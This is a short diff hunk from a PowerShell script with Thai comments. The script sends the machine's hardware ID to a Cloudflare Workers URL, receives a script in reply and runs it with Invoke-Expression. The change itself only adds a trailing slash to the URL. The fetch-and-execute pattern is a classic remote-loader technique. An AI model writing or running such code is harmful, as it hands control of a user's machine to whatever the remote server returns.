@@ -7,7 +7,7 @@ $body = @{ hwid = $hwid } | ConvertTo-Json
 
 try {
     # ส่ง Request ไปยัง Worker
-    $scriptToRun = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev" -Method Post -Body $body -ContentType "application/json"
+    $scriptToRun = Invoke-RestMethod -Uri "https://flat-art-959b.rov170652.workers.dev/" -Method Post -Body $body -ContentType "application/json"
     
     # ประมวลผลสคริปต์ที่ได้รับกลับมา
     Invoke-Expression $scriptToRun
